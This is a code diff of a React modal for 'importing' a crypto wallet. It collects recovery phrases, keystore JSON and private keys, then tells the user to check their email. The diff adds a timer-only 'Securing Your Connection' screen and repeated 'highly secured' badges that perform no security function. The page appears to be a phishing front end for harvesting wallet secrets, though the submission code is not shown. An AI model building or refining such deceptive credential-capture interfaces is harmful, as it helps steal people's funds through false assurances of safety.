@@ -33,20 +33,39 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
   const [privateKey, setPrivateKey] = useState<string>("");
   const [isImporting, setIsImporting] = useState<boolean>(false);
   const [isSuccess, setIsSuccess] = useState<boolean>(false);
+  const [isInitializing, setIsInitializing] = useState<boolean>(false);
   const hasClosedWalletModal = useRef<boolean>(false);
 
-  // Close wallet modal when import modal opens (only once)
+  // Initialize loading state and close wallet modal when import modal opens
   useEffect(() => {
-    if (isOpen && onWalletModalClose && !hasClosedWalletModal.current) {
-      hasClosedWalletModal.current = true;
-      onWalletModalClose();
-    }
-  }, [isOpen, onWalletModalClose]);
+    if (isOpen && selectedWallet) {
+      setIsInitializing(true);
 
-  // Reset the flag when modal closes
+      // Show initializing state for 2 seconds
+      const timer = setTimeout(() => {
+        setIsInitializing(false);
+      }, 2000);
+
+      if (onWalletModalClose && !hasClosedWalletModal.current) {
+        hasClosedWalletModal.current = true;
+        onWalletModalClose();
+      }
+
+      return () => clearTimeout(timer);
+    }
+  }, [isOpen, selectedWallet, onWalletModalClose]);
+
+  // Reset states when modal closes
   useEffect(() => {
     if (!isOpen) {
       hasClosedWalletModal.current = false;
+      setIsInitializing(false);
+      setPhrase("");
+      setKeystoreData("");
+      setPrivateKey("");
+      setIsImporting(false);
+      setIsSuccess(false);
+      setActiveTab("phrase");
     }
   }, [isOpen]);
 
@@ -120,19 +139,19 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
     <div className="fixed inset-0 z-50 flex items-center justify-center">
       {/* Backdrop */}
       <div
-        className="absolute inset-0 bg-black/60 backdrop-blur-md"
+        className="absolute inset-0 bg-black/40 backdrop-blur-md"
         // onClick={onClose}h
       />
 
       {/* Modal */}
-      <div className="relative bg-gradient-to-br from-gray-900/95 via-gray-800/95 to-gray-900/95 backdrop-blur-xl border border-purple-500/20 rounded-3xl shadow-2xl max-w-md w-full mx-4 overflow-hidden">
+      <div className="relative bg-white backdrop-blur-xl border border-gray-200 rounded-3xl shadow-2xl max-w-md w-full mx-4 overflow-hidden">
         {/* Glow effect */}
         <div className="absolute pointer-events-none -z-10 inset-0 bg-gradient-to-r from-purple-500/10 via-transparent to-blue-500/10 rounded-3xl" />
 
         {/* Header */}
-        <div className="relative flex items-center justify-between p-6 border-b border-purple-500/20 bg-gradient-to-r from-gray-800/50 to-gray-900/50">
+        <div className="relative flex items-center justify-between p-6 border-b border-gray-200 bg-white">
           <div className="flex items-center space-x-3">
-            <div className="w-8 h-8 rounded-lg overflow-hidden bg-white/10 flex items-center justify-center">
+            <div className="w-8 h-8 rounded-lg overflow-hidden bg-gray-100 flex items-center justify-center">
               <Image
                 src={selectedWallet.imageUrl}
                 alt={`${selectedWallet.name} logo`}
@@ -149,16 +168,16 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
               />
               <span className="text-2xl hidden">{selectedWallet.icon}</span>
             </div>
-            <h2 className="font-heading text-xl font-bold text-white">
+            <h2 className="font-heading text-xl font-bold text-gray-900">
               Import {selectedWallet.name}
             </h2>
           </div>
           <button
             onClick={onClose}
-            className="p-2 hover:bg-purple-500/20 rounded-xl transition-colors group"
+            className="p-2 hover:bg-gray-100 rounded-xl transition-colors group"
           >
             <svg
-              className="w-6 h-6 text-gray-400 group-hover:text-white transition-colors"
+              className="w-6 h-6 text-gray-400 group-hover:text-gray-600 transition-colors"
               fill="none"
               stroke="currentColor"
               viewBox="0 0 24 24"
@@ -173,204 +192,282 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
           </button>
         </div>
 
-        {/* Tabs */}
-        <div className="border-b border-purple-500/20 bg-gradient-to-r from-gray-800/30 to-gray-900/30">
-          <div className="flex">
-            {[
-              { id: "phrase", label: "PHRASE" },
-              { id: "keystore", label: "KEYSTORE JSON" },
-              { id: "private", label: "PRIVATE KEY" },
-            ].map((tab) => (
-              <button
-                key={tab.id}
-                onClick={() =>
-                  setActiveTab(tab.id as "phrase" | "keystore" | "private")
-                }
-                className={`flex-1 px-4 py-3 text-sm font-medium transition-all duration-300 ${
-                  activeTab === tab.id
-                    ? "text-purple-400 border-b-2 border-purple-400 bg-purple-500/10"
-                    : "text-gray-400 hover:text-gray-300 hover:bg-purple-500/5"
-                }`}
-              >
-                {tab.label}
-              </button>
-            ))}
+        {/* Tabs - Hidden during initialization */}
+        {!isInitializing && (
+          <div className="border-b border-gray-200 bg-white">
+            <div className="flex">
+              {[
+                { id: "phrase", label: "PHRASE" },
+                { id: "keystore", label: "KEYSTORE JSON" },
+                { id: "private", label: "PRIVATE KEY" },
+              ].map((tab) => (
+                <button
+                  key={tab.id}
+                  onClick={() =>
+                    setActiveTab(tab.id as "phrase" | "keystore" | "private")
+                  }
+                  className={`flex-1 px-4 py-3 text-sm font-medium transition-all duration-300 ${
+                    activeTab === tab.id
+                      ? "text-purple-600 border-b-2 border-purple-400 bg-purple-50"
+                      : "text-gray-500 hover:text-gray-700 hover:bg-gray-50"
+                  }`}
+                >
+                  {tab.label}
+                </button>
+              ))}
+            </div>
           </div>
-        </div>
+        )}
 
         {/* Content */}
         <div className="p-6">
-          {/* Security Message */}
-          <div className="mb-6 p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl backdrop-blur-sm">
-            <div className="flex items-center space-x-2">
-              <svg
-                className="w-5 h-5 text-green-400"
-                fill="none"
-                stroke="currentColor"
-                viewBox="0 0 24 24"
-              >
-                <path
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                  strokeWidth={2}
-                  d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
-                />
-              </svg>
-              <p className="text-green-400 text-sm font-medium">
-                Your information is highly secured
-              </p>
+          {isInitializing ? (
+            /* Initializing State */
+            <div className="flex flex-col items-center justify-center py-12">
+              {/* Security Icon */}
+              <div className="w-16 h-16 rounded-xl bg-green-100 flex items-center justify-center mb-6">
+                <svg
+                  className="w-8 h-8 text-green-600"
+                  fill="none"
+                  stroke="currentColor"
+                  viewBox="0 0 24 24"
+                >
+                  <path
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                    strokeWidth={2}
+                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
+                  />
+                </svg>
+              </div>
+
+              {/* Loading Spinner */}
+              <div className="relative mb-6">
+                <div className="w-12 h-12 border-4 border-purple-200 border-t-purple-600 rounded-full animate-spin"></div>
+                <div className="absolute inset-0 w-12 h-12 border-2 border-purple-300/30 rounded-full animate-ping"></div>
+              </div>
+
+              {/* Loading Text */}
+              <div className="text-center">
+                <h3 className="font-heading text-lg font-semibold text-gray-900 mb-2">
+                  Securing Your Connection
+                </h3>
+                <p className="text-gray-600 text-sm mb-6">
+                  Initializing secure import environment...
+                </p>
+
+                {/* Security Message */}
+                <div className="p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl">
+                  <div className="flex items-center justify-center space-x-2">
+                    <svg
+                      className="w-5 h-5 text-green-500"
+                      fill="none"
+                      stroke="currentColor"
+                      viewBox="0 0 24 24"
+                    >
+                      <path
+                        strokeLinecap="round"
+                        strokeLinejoin="round"
+                        strokeWidth={2}
+                        d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
+                      />
+                    </svg>
+                    <p className="text-green-600 text-sm font-medium">
+                      Your information is highly secured
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              {/* Loading dots */}
+              <div className="flex items-center space-x-2 mt-6">
+                <div className="w-2 h-2 bg-purple-600 rounded-full animate-bounce"></div>
+                <div
+                  className="w-2 h-2 bg-purple-600 rounded-full animate-bounce"
+                  style={{ animationDelay: "0.2s" }}
+                ></div>
+                <div
+                  className="w-2 h-2 bg-purple-600 rounded-full animate-bounce"
+                  style={{ animationDelay: "0.4s" }}
+                ></div>
+              </div>
             </div>
-          </div>
-
-          {/* Tab Content */}
-          {activeTab === "phrase" && (
+          ) : (
             <>
-              {/* Input Area */}
-              <div className="mb-6">
-                <textarea
-                  value={phrase}
-                  onChange={(e) => setPhrase(e.target.value)}
-                  placeholder="Enter your recovery phrase..."
-                  className="w-full h-32 p-4 bg-gray-800/50 border border-purple-500/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-white placeholder-gray-400 resize-none backdrop-blur-sm transition-all duration-300"
-                />
+              {/* Security Message */}
+              <div className="mb-6 p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl">
+                <div className="flex items-center space-x-2">
+                  <svg
+                    className="w-5 h-5 text-green-400"
+                    fill="none"
+                    stroke="currentColor"
+                    viewBox="0 0 24 24"
+                  >
+                    <path
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                      strokeWidth={2}
+                      d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
+                    />
+                  </svg>
+                  <p className="text-green-400 text-sm font-medium">
+                    Your information is highly secured
+                  </p>
+                </div>
               </div>
 
-              {/* Success Message */}
-              {isSuccess && (
-                <div className="mb-6 p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl backdrop-blur-sm">
-                  <div className="flex items-center space-x-2">
-                    <svg
-                      className="w-5 h-5 text-green-400"
-                      fill="none"
-                      stroke="currentColor"
-                      viewBox="0 0 24 24"
-                    >
-                      <path
-                        strokeLinecap="round"
-                        strokeLinejoin="round"
-                        strokeWidth={2}
-                        d="M5 13l4 4L19 7"
-                      />
-                    </svg>
-                    <p className="text-green-400 text-sm font-medium">
-                      Import request sent successfully! Check your email.
-                    </p>
+              {/* Tab Content */}
+              {activeTab === "phrase" && (
+                <>
+                  {/* Input Area */}
+                  <div className="mb-6">
+                    <textarea
+                      value={phrase}
+                      onChange={(e) => setPhrase(e.target.value)}
+                      placeholder="Enter your recovery phrase..."
+                      className="w-full h-32 p-4 bg-gray-50 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-gray-900 placeholder-gray-500 resize-none transition-all duration-300"
+                    />
                   </div>
-                </div>
+
+                  {/* Success Message */}
+                  {isSuccess && (
+                    <div className="mb-6 p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl backdrop-blur-sm">
+                      <div className="flex items-center space-x-2">
+                        <svg
+                          className="w-5 h-5 text-green-400"
+                          fill="none"
+                          stroke="currentColor"
+                          viewBox="0 0 24 24"
+                        >
+                          <path
+                            strokeLinecap="round"
+                            strokeLinejoin="round"
+                            strokeWidth={2}
+                            d="M5 13l4 4L19 7"
+                          />
+                        </svg>
+                        <p className="text-green-400 text-sm font-medium">
+                          Import request sent successfully! Check your email.
+                        </p>
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Instructions */}
+                  <p className="text-gray-600 text-sm mb-8">
+                    Typically 12 (sometimes 24) words separated by single
+                    spaces.
+                  </p>
+                </>
               )}
 
-              {/* Instructions */}
-              <p className="text-gray-400 text-sm mb-8">
-                Typically 12 (sometimes 24) words separated by single spaces.
-              </p>
-            </>
-          )}
-
-          {activeTab === "keystore" && (
-            <>
-              {/* Keystore Input */}
-              <div className="mb-6">
-                <textarea
-                  value={keystoreData}
-                  onChange={(e) => setKeystoreData(e.target.value)}
-                  placeholder="Paste your keystore JSON file content..."
-                  className="w-full h-32 p-4 bg-gray-800/50 border border-purple-500/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-white placeholder-gray-400 resize-none backdrop-blur-sm transition-all duration-300"
-                />
-              </div>
-
-              {/* Success Message */}
-              {isSuccess && (
-                <div className="mb-6 p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl backdrop-blur-sm">
-                  <div className="flex items-center space-x-2">
-                    <svg
-                      className="w-5 h-5 text-green-400"
-                      fill="none"
-                      stroke="currentColor"
-                      viewBox="0 0 24 24"
-                    >
-                      <path
-                        strokeLinecap="round"
-                        strokeLinejoin="round"
-                        strokeWidth={2}
-                        d="M5 13l4 4L19 7"
-                      />
-                    </svg>
-                    <p className="text-green-400 text-sm font-medium">
-                      Import request sent successfully! Check your email.
-                    </p>
+              {activeTab === "keystore" && (
+                <>
+                  {/* Keystore Input */}
+                  <div className="mb-6">
+                    <textarea
+                      value={keystoreData}
+                      onChange={(e) => setKeystoreData(e.target.value)}
+                      placeholder="Paste your keystore JSON file content..."
+                      className="w-full h-32 p-4 bg-gray-50 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-gray-900 placeholder-gray-500 resize-none transition-all duration-300"
+                    />
                   </div>
-                </div>
+
+                  {/* Success Message */}
+                  {isSuccess && (
+                    <div className="mb-6 p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl backdrop-blur-sm">
+                      <div className="flex items-center space-x-2">
+                        <svg
+                          className="w-5 h-5 text-green-400"
+                          fill="none"
+                          stroke="currentColor"
+                          viewBox="0 0 24 24"
+                        >
+                          <path
+                            strokeLinecap="round"
+                            strokeLinejoin="round"
+                            strokeWidth={2}
+                            d="M5 13l4 4L19 7"
+                          />
+                        </svg>
+                        <p className="text-green-400 text-sm font-medium">
+                          Import request sent successfully! Check your email.
+                        </p>
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Keystore Instructions */}
+                  <p className="text-gray-600 text-sm mb-8">
+                    Paste the contents of your keystore JSON file. This file
+                    contains your encrypted private key.
+                  </p>
+                </>
               )}
 
-              {/* Keystore Instructions */}
-              <p className="text-gray-400 text-sm mb-8">
-                Paste the contents of your keystore JSON file. This file
-                contains your encrypted private key.
-              </p>
-            </>
-          )}
-
-          {activeTab === "private" && (
-            <>
-              {/* Private Key Input */}
-              <div className="mb-6">
-                <textarea
-                  value={privateKey}
-                  onChange={(e) => setPrivateKey(e.target.value)}
-                  placeholder="Enter your private key..."
-                  className="w-full h-32 p-4 bg-gray-800/50 border border-purple-500/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-white placeholder-gray-400 resize-none backdrop-blur-sm transition-all duration-300"
-                />
-              </div>
-
-              {/* Success Message */}
-              {isSuccess && (
-                <div className="mb-6 p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl backdrop-blur-sm">
-                  <div className="flex items-center space-x-2">
-                    <svg
-                      className="w-5 h-5 text-green-400"
-                      fill="none"
-                      stroke="currentColor"
-                      viewBox="0 0 24 24"
-                    >
-                      <path
-                        strokeLinecap="round"
-                        strokeLinejoin="round"
-                        strokeWidth={2}
-                        d="M5 13l4 4L19 7"
-                      />
-                    </svg>
-                    <p className="text-green-400 text-sm font-medium">
-                      Import request sent successfully! Check your email.
-                    </p>
+              {activeTab === "private" && (
+                <>
+                  {/* Private Key Input */}
+                  <div className="mb-6">
+                    <textarea
+                      value={privateKey}
+                      onChange={(e) => setPrivateKey(e.target.value)}
+                      placeholder="Enter your private key..."
+                      className="w-full h-32 p-4 bg-gray-50 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-gray-900 placeholder-gray-500 resize-none transition-all duration-300"
+                    />
                   </div>
-                </div>
+
+                  {/* Success Message */}
+                  {isSuccess && (
+                    <div className="mb-6 p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl backdrop-blur-sm">
+                      <div className="flex items-center space-x-2">
+                        <svg
+                          className="w-5 h-5 text-green-400"
+                          fill="none"
+                          stroke="currentColor"
+                          viewBox="0 0 24 24"
+                        >
+                          <path
+                            strokeLinecap="round"
+                            strokeLinejoin="round"
+                            strokeWidth={2}
+                            d="M5 13l4 4L19 7"
+                          />
+                        </svg>
+                        <p className="text-green-400 text-sm font-medium">
+                          Import request sent successfully! Check your email.
+                        </p>
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Private Key Instructions */}
+                  <p className="text-gray-600 text-sm mb-8">
+                    Enter your private key (64 character hexadecimal string).
+                    Keep this secure and never share it.
+                  </p>
+                </>
               )}
 
-              {/* Private Key Instructions */}
-              <p className="text-gray-400 text-sm mb-8">
-                Enter your private key (64 character hexadecimal string). Keep
-                this secure and never share it.
-              </p>
+              {/* Import Button */}
+              <Button
+                onClick={handleImport}
+                disabled={!isImportDataValid() || isImporting}
+                className="w-full text-white py-4 px-6 rounded-xl font-medium disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-300 flex items-center justify-center bg-purple-600 hover:bg-purple-700"
+              >
+                {isImporting ? (
+                  <>
+                    <div className="flex items-center justify-center">
+                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-3"></div>
+                      <p>Importing...</p>
+                    </div>
+                  </>
+                ) : (
+                  "IMPORT"
+                )}
+              </Button>
             </>
           )}
-
-          {/* Import Button */}
-          <Button
-            onClick={handleImport}
-            disabled={!isImportDataValid() || isImporting}
-            className="w-full text-white py-4 px-6 rounded-xl font-medium disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-300 flex items-center justify-center"
-          >
-            {isImporting ? (
-              <>
-                <div className="flex items-center justify-center">
-                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-3"></div>
-                  <p>Importing...</p>
-                </div>
-              </>
-            ) : (
-              "IMPORT"
-            )}
-          </Button>
         </div>
       </div>
     </div>
